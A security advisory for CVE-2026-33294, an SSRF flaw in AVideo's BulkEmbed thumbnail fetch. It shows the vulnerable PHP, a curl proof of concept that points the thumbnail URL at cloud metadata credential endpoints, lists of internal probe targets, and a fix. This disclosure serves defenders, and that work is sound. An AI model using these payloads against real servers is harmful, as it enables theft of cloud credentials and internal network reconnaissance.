# [M] AVideo Affected by SSRF in BulkEmbed Thumbnail Fetch Allows Reading Internal Network Resources

## Summary
Severity: Medium
Advisory: GHSA-66cw-h2mj-j39p
CVE: CVE-2026-33294
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-66cw-h2mj-j39p
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The BulkEmbed plugin's save endpoint (`plugin/BulkEmbed/save.json.php`) fetches user-supplied thumbnail URLs via `url_get_contents()` without SSRF protection. Unlike all six other URL-fetching endpoints in AVideo that were hardened with `isSSRFSafeURL()`, this code path was missed. An authenticated attacker can force the server to make HTTP requests to internal network resources and retrieve the responses by viewing the saved video thumbnail.

## Details

When saving bulk-embedded videos, user-supplied thumbnail URLs from `$_POST['itemsToSave'][x]['thumbs']` flow directly into `url_get_contents()` with no SSRF validation:

**`plugin/BulkEmbed/save.json.php:68-105`**
```php
foreach ($_POST['itemsToSave'] as $value) {
    foreach ($value as $key => $value2) {
        $value[$key] = xss_esc($value2);  // HTML entity encoding — irrelevant for SSRF
    }
    // ...
    $poster = Video::getPathToFile("{$paths['filename']}.jpg");
    $thumbs = $value['thumbs'];              // ← attacker-controlled URL
    if (!empty($thumbs)) {
        $contentThumbs = url_get_contents($thumbs);  // ← fetched without SSRF check
        if (!empty($contentThumbs)) {
            make_path($poster);
            $bytes = file_put_contents($poster, $contentThumbs);  // ← response saved to disk
        }
    }
    // ...
    $videos->setStatus('a');  // ← video set to active, thumbnail publicly accessible
```

The `url_get_contents()` function internally calls `isValidURLOrPath()` which only validates URL format (scheme, host presence) — it does **not** block requests to private IPs, localhost, or cloud metadata endpoints.

**All other URL-fetching endpoints are protected.** The `isSSRFSafeURL()` function is called in:
- `plugin/Scheduler/Scheduler.php`
- `plugin/LiveLinks/proxy.php` (two call sites)
- `plugin/AI/receiveAsync.json.php`
- `objects/aVideoEncoder.json.php`
- `objects/aVideoEncoderReceiveImage.json.php`

BulkEmbed is the only URL-fetching endpoint that was not hardened.

**This is a full-read SSRF**, not blind — the HTTP response body is written to disk as the video thumbnail and served to the attacker when they view the video poster image.

## PoC

**Prerequisites:** Authenticated session with BulkEmbed permission. The `onlyAdminCanBulkEmbed` option defaults to `true` (line 41 of `BulkEmbed.php`), but is commonly disabled for multi-user platforms.

**Step 1: Authenticate and obtain session cookie**

```bash
COOKIE=$(curl -s -c - "http://avideo.local/user" \
  -d "user=testuser&pass=testpass&redirectUri=/" | grep PHPSESSID | awk '{print $NF}')
```

**Step 2: Send BulkEmbed save request with internal URL as thumbnail**

```bash
curl -s -b "PHPSESSID=$COOKIE" \
  "http://avideo.local/plugin/BulkEmbed/save.json.php" \
  -d "itemsToSave[0][title]=SSRF+Test" \
  -d "itemsToSave[0][description]=test" \
  -d "itemsToSave[0][duration]=PT1M" \
  -d "itemsToSave[0][link]=https://www.youtube.com/watch?v=dQw4w9WgXcQ" \
  -d "itemsToSave[0][thumbs]=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -d "itemsToSave[0][date]="
```

**Expected response:**

```json
{"error":false,"msg":[{"video":{...},"value":{...},"videos_id":123}],"playListId":0}
```

**Step 3: Retrieve the SSRF response from the saved thumbnail**

```bash
# Extract the filename from the response, then fetch the poster image
curl -s "http://avideo.local/videos/{filename}.jpg"
```

The content of the internal HTTP response (e.g., AWS IAM role names from the metadata service) is returned as the image file content.

**Cloud metadata example targets:**
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — AWS IAM role names
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}` — temporary AWS credentials
- `http://metadata.google.internal/computeMetadata/v1/` — GCP metadata (requires header, may not work)
- `http://169.254.169.254/metadata/instance?api-version=2021-02-01` — Azure instance metadata

**Internal network scanning:**
- `http://10.0.0.1:8080/` — probe internal services
- `http://localhost:3306/` — probe local database ports

## Impact

- **Cloud credential theft:** On AWS/GCP/Azure-hosted instances, an attacker can retrieve cloud IAM credentials from the metadata service, potentially gaining access to cloud infrastructure (S3 buckets, databases, other services).
- **Internal network reconnaissance:** Attacker can map internal network topology by probing private IP ranges and observing which requests return content vs. timeout.
- **Internal service data exfiltration:** Any HTTP-accessible internal service (admin panels, monitoring dashboards, databases with HTTP interfaces) can have its responses exfiltrated through the thumbnail mechanism.
- **Scope change:** The attack crosses security boundaries — from the web application into the internal network/cloud infrastructure, which is a different trust zone.

## Recommended Fix

Add `isSSRFSafeURL()` validation before the `url_get_contents()` call in `plugin/BulkEmbed/save.json.php`, consistent with all other URL-fetching endpoints:

```php
    $thumbs = $value['thumbs'];
    if (!empty($thumbs)) {
        if (!isSSRFSafeURL($thumbs)) {
            _error_log("BulkEmbed: SSRF protection blocked thumbnail URL: " . $thumbs);
            continue;
        }
        $contentThumbs = url_get_contents($thumbs);
        if (!empty($contentThumbs)) {
            make_path($poster);
            $bytes = file_put_contents($poster, $contentThumbs);
            _error_log("thumbs={$thumbs} poster=$poster bytes=$bytes strlen=" . strlen($contentThumbs));
        } else {
            _error_log("ERROR thumbs={$thumbs} poster=$poster");
        }
    }
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-66cw-h2mj-j39p
- https://nvd.nist.gov/vuln/detail/CVE-2026-33294
- https://github.com/WWBN/AVideo/commit/4589a3a089baf4ea439481f5088b38a8aa9c82b6
- https://github.com/WWBN/AVideo
